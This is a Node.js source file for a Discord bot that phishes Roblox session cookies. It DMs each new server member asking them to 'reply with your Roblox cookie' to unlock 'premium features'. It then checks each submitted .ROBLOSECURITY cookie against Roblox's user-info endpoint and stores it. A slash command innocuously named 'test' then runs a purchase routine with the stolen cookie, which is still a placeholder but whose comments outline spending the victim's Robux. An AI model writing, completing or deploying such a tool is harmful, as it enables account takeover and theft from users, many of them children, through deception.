require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Client, GatewayIntentBits, Partials, REST, Routes, SlashCommandBuilder } = require('discord.js');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

if (!TOKEN || !GUILD_ID) {
  console.error("Missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID in .env");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
  ],
  partials: [Partials.Channel], // enable DMs
});

const dataFile = path.join(__dirname, 'verificationData.json');

// Persistent sets stored as arrays in JSON file
let verifiedUsers = new Set();
let dmSentUsers = new Set();
// Store cookies in memory for session (WARNING: For production, encrypt or secure storage is recommended)
const userCookies = new Map();

function loadData() {
  try {
    const raw = fs.readFileSync(dataFile, 'utf8');
    const data = JSON.parse(raw);
    verifiedUsers = new Set(data.verifiedUsers || []);
    dmSentUsers = new Set(data.dmSentUsers || []);
    console.log("Verification data loaded.");
  } catch {
    console.log("No verification data found, starting fresh.");
    verifiedUsers = new Set();
    dmSentUsers = new Set();
  }
}

function saveData() {
  const data = {
    verifiedUsers: Array.from(verifiedUsers),
    dmSentUsers: Array.from(dmSentUsers),
  };
  fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
  console.log("Verification data saved.");
}

loadData();

// Roblox API: Validate cookie and get user info
async function validateRobloxCookie(cookie) {
  try {
    const res = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet',
      },
      timeout: 5000,
    });
    if (res.status === 200 && res.data && res.data.UserID) {
      return res.data; // Valid cookie with user info
    }
    return null;
  } catch {
    return null;
  }
}

// Placeholder purchase function - replace with your purchase logic
async function buyRandomItem(cookie) {
  // Here you would:
  // 1. Check Robux balance via Roblox API
  // 2. Pick a random item from catalog or predefined list
  // 3. Call Roblox purchase API with cookie

  // For now, simulate success:
  return { success: true, message: "🎉 Purchased a random item successfully! (placeholder)" };
}

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  const commands = [
    new SlashCommandBuilder()
      .setName('test')
      .setDescription('Buy a random item from the shop using your Robux'),
  ].map(cmd => cmd.toJSON());

  try {
    await rest.put(
      Routes.applicationGuildCommands(client.user.id, GUILD_ID),
      { body: commands }
    );
    console.log('Slash commands registered.');
  } catch (err) {
    console.error('Failed to register slash commands:', err);
  }
});

// DM new members once if not verified or already DM'd
client.on('guildMemberAdd', async (member) => {
  const userId = member.user.id;
  if (verifiedUsers.has(userId)) return;
  if (dmSentUsers.has(userId)) return;

  try {
    await member.send(
      `Welcome to ${member.guild.name}! You can stay and chat, but if you want to enjoy premium features like trading, please reply with your Roblox cookie.`
    );
    dmSentUsers.add(userId);
    saveData();
    console.log(`Sent welcome DM to ${member.user.tag}`);
  } catch (err) {
    console.error(`Failed to DM ${member.user.tag}:`, err);
  }
});

// Listen for DM messages to accept Roblox cookies
client.on('messageCreate', async (message) => {
  if (message.channel.type !== 1) return; // Only DMs
  if (message.author.bot) return;

  const userId = message.author.id;
  const cookie = message.content.trim();

  // Basic length check - Roblox cookies vary, but usually ~85+ chars
  if (cookie.length < 20) {
    await message.reply('That doesn’t look like a valid Roblox cookie. Please try again.');
    return;
  }

  // Validate cookie
  const userInfo = await validateRobloxCookie(cookie);
  if (!userInfo) {
    await message.reply('Invalid Roblox cookie. Please check and send again.');
    return;
  }

  // Save cookie and mark verified
  userCookies.set(userId, cookie);
  verifiedUsers.add(userId);
  dmSentUsers.delete(userId);
  saveData();

  await message.reply(`Thanks, **${userInfo.UserName}**! Your cookie has been verified, and premium features are now unlocked.`);
  console.log(`User ${userInfo.UserName} (${userId}) verified.`);
});

// Handle slash commands
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'test') {
    const userId = interaction.user.id;

    if (!verifiedUsers.has(userId)) {
      await interaction.reply({ content: "You must submit your Roblox cookie first!", ephemeral: true });
      return;
    }

    const cookie = userCookies.get(userId);
    if (!cookie) {
      await interaction.reply({ content: "Your Roblox cookie is missing. Please resubmit it via DM.", ephemeral: true });
      return;
    }

    // Re-validate cookie before purchase
    const userInfo = await validateRobloxCookie(cookie);
    if (!userInfo) {
      // Invalidate stored data
      verifiedUsers.delete(userId);
      userCookies.delete(userId);
      saveData();

      await interaction.reply({ content: "Your Roblox cookie appears invalid now. Please submit a valid one again via DM.", ephemeral: true });
      return;
    }

    // Run placeholder purchase
    const purchaseResult = await buyRandomItem(cookie);

    if (!purchaseResult.success) {
      await interaction.reply({ content: purchaseResult.message, ephemeral: true });
      return;
    }

    await interaction.reply(purchaseResult.message);
  }
});

client.login(TOKEN);
